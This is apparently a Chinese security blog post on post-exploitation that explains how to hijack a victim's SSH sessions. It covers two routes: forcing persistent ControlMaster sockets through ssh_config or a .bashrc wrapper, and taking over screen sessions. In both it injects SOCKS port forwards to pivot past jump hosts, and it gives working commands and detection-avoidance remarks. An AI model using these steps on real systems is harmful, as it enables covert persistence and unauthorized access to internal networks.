# 劫持SSH会话注入端口转发


0x00 前言
=======

* * *

昨天Ａ牛发群里的链接，其实这种攻击我感觉适合留后门，属于Post Exploitation阶段，我以前也没用过这个方法，都是傻呼呼的用个ld_preload后门，实际环境测试通过后，发现可用，比较有实用价值，就分享下，有错误的地方还请大家指出。

0x01 细节
=======

* * *

1.1第一种场景：
---------

攻击流程如下：SSH客户（ssh_user）连接到hop_1，攻击者(attacker)能够控制ssh_user这台机器，攻击者通过注入端口转发来实现入侵hop_1和hop_2之后的网络。步骤如下：

![enter image description here](http://drops.javaweb.org/uploads/images/dd3dfa45d97f87a27252ce059349075b74452a1b.jpg)

### 1. 攻击者可以用两种方式来修改ssh客户端，如果有ROOT权限可以直接修改/etc/ssh/ssh_config，如果没有修改ssh_config文件的权限，可以通过在相应用户的.bashrc中封装ssh来实现。主要涉及的项如下：

```
ControlPath /tmp/%r@%h:%p
ControlMaster auto
ControlPersist yes　　

```

![enter image description here](http://drops.javaweb.org/uploads/images/a2d791f6707882fc5a48514f9d2877aa24b151f5.jpg)

如果打开了ControlPersist，表示用户在进行SSH连接后，即使退出了会话，我们也能通过socket劫持，因为这个文件不会删除。

### 2. 当(ssh_user)连接到hop_1（192.168.56.131）的时候，会在/tmp目录下生成一个socket文件，我们使用

```
ssh -S /tmp/root@192.168.56.131\:22 %h

```

来连接

![enter image description here](http://drops.javaweb.org/uploads/images/668f485b24977c632696de26dccd9716877e46b5.jpg)

注入命令端口转发的命令如下：

```
ssh -O forward -D 8888 -S /tmp/root@192.168.56.131\:22 %x

```

![enter image description here](http://drops.javaweb.org/uploads/images/2470d93111f1811f7d80c0158923b806e04288bb.jpg)

执行完这条命令后，我们就可以使用ssh_user这台机器的8888端口做SOCKS5代理，访问hop_2后的网段了。

### 3. 前面说过，如果ControlPersist为yes，则不会自动删除sockets文件，我们可以手工rm删除/tmp/root@192.168.56.131:22，也可以优雅的使用

```
root@kali: # ssh -O exit -S /tmp/root@192.168.56.131\:22 %x

```

来删除。

在.bashrc里封装ssh命令的方法如下：

```
ssh () 
{ 
    /usr/bin/ssh -o "ControlMaster=auto" -o "ControlPath=/tmp/%r@%h:%p" -o "ControlPersist=yes" "$@";
}

```

![enter image description here](http://drops.javaweb.org/uploads/images/45f1222847bd95fe007387b0787c1fd119e11766.jpg)

1.2第二种场景：
---------

这种情景是ssh_user用户使用screen管理ssh会话时的情景，步骤如下：

![enter image description here](http://drops.javaweb.org/uploads/images/696e98402ae6f2c175c9baa53ca5154ab2d022a7.jpg)

### 1. 当ssh_user使用

```
screen ssh root@192.168.56.131

```

连接远程的hop_1（192.168.56.131）时，会在/var/run/screen有显示相应的文件

```
root@kali:~# ls -la /var/run/screen/
total 0
drwxrwxr-x  3 root utmp  60 Mar 16 03:37 .
drwxr-xr-x 20 root root 640 Mar  3 21:23 ..
drwx------  2 root root  60 Mar 16 04:21 S-root

```

其中S-ROOT表示是本地的root用户连接的远程，可以用`screen -r root/`来接管会话，或者用`screen -x 6851.pts-0.kali`。

### 2. 如果要注入端口转发，还有 一点要注意，需要先执行script /dev/null来绕过pts/tty限制。命令如下

```
root@kali:~# lsof -i TCP:8888
root@kali:~# script /dev/null 
Script started, file is /dev/null
root@kali:~# screen -S 6851.pts-0.kali -p 0 -X  stuff $'~C'
root@kali:~# screen -S 6851.pts-0.kali -p 0 -X  stuff $'-D:8888\n\n'
root@kali:~# lsof -i TCP:8888
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     6852 root    7u  IPv4  94301      0t0  TCP *:8888 (LISTEN)
ssh     6852 root    8u  IPv6  94302      0t0  TCP *:8888 (LISTEN)

```

注入screen的ssh会话，会有一个不好的地方，就是你敲的命令，会在当前正在连接的用户那里同时显示，容易被发现。

![enter image description here](http://drops.javaweb.org/uploads/images/3f1b41753207b6e99335fb8c1a4133ef565040ab.jpg)

0x02 参考文章
=========

* * *

http://0xthem.blogspot.com/2015/03/hijacking-ssh-to-inject-port-forwards.html